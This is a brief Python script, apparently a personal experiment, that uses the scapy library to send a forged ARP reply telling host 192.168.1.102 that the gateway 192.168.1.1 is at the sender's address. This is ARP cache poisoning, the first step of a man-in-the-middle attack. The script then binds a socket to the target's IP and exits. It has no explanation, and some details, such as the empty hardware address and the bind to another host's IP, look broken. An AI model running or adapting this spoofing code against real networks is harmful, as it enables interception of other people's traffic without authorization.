import socket
import scapy.all as scapy


spoofed= scapy.ARP(op=2, pdst="192.168.1.102", psrc="192.168.1.1", hwdst="")
scapy.send(spoofed, verbose= True)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(("192.168.1.102", 7176))


print('end')

